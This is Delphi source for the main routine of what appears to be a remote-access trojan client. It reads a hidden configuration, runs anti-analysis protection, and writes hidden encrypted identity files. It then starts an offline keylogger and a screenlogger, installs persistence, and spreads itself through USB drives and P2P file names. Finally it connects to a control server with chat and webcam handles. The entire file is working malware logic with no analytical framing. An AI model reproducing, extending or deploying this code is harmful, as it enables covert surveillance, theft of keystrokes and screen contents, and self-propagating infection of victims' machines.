program Plugin;

{$IMAGEBASE 23140030}

uses
  Windows, UnitConstants, UnitVariables, UnitFunctions, UnitConfiguration, UnitKeyboard,
  UnitPluginManager, UnitSpreading, uDEP, UnitActiveConnections, UnitClientHandle,
  UnitRegistryManager, UnitTasksManager, UnitFilesManager, UnitConnection,
  UnitScreenlogger, UnitPersistence, UnitEncryption, UnitProtection;

var
  TmpStr: string;
begin
  if not GetConfigFile then ExitProcess(0);
  ConfigFile := DatasPath + '\cfg';
  LoadConfiguration;

  SqlFile := DatasPath + '\sqlite3.dll';
  KeylogsPath := DatasPath + '\klogs';
  ScreenlogsPath := DatasPath + '\slogs';
  PluginsPath := DatasPath + '\plugs';

  if _AntiPA then MyStartThread(@InitProtection);         

  if _MutexName <> '' then
  begin
    MainMutex := CreateMutex(nil, False, PChar(_MutexName + '_PLUGIN'));
    if GetLastError = ERROR_ALREADY_EXISTS then ExitProcess(0);
  end;

  if (not FileExists(DatasPath + '\grp')) and (not FileExists(DatasPath + '\id')) then
  if _Install = True then InstalledDate := MyGetDate('-') + ' ' + MyGetTime(':');

  if FileExists(DatasPath + '\id') then
  begin
    TmpStr := FileToStr(DatasPath + '\id');
    TmpStr := EnDecryptText(TmpStr, PROGRAMPASSWORD);
    NewIdentification := TmpStr;
  end
  else
  begin
    NewIdentification := _ClientId;
    TmpStr := NewIdentification;
    TmpStr := EnDecryptText(TmpStr, PROGRAMPASSWORD);
    MyCreateFile(DatasPath + '\id', TmpStr, Length(TmpStr));
    HideFileName(DatasPath + '\id');
  end;

  if FileExists(DatasPath + '\grp') then
  begin
    TmpStr := FileToStr(DatasPath + '\grp');
    TmpStr := EnDecryptText(TmpStr, PROGRAMPASSWORD);
    NewGroup := TmpStr;
  end
  else
  begin
    NewGroup := _GroupId;
    TmpStr := NewGroup;
    TmpStr := EnDecryptText(TmpStr, PROGRAMPASSWORD);
    MyCreateFile(DatasPath + '\grp', TmpStr, Length(TmpStr));
    HideFileName(DatasPath + '\grp');
  end;

  if _Install = True then
  begin
    if _Keylogger then StartOfflineKeylogger;
    if _Screenlogger then StartScreenlogger;

    if _Persistence = True then
    begin
      PersistMutex := CreateMutex(nil, False, PChar(_MutexName + '_PERSIST'));
      if GetLastError <> ERROR_ALREADY_EXISTS then MyStartThread(@InitPersistence) else
      CloseHandle(PersistMutex);
    end;

    if _USB = True then if _SpreadAs <> '' then MyStartThread(@USBSpreading);
    if _P2P = True then if _P2PNames <> '' then MyStartThread(@StartP2PSpreading);
  end;

  //Start connection to server
  MyStartThread(@StartConnection);
  CreateClientHandle; //Create client handle for both chat and webcam
  while True do ProcessMessages;
end.
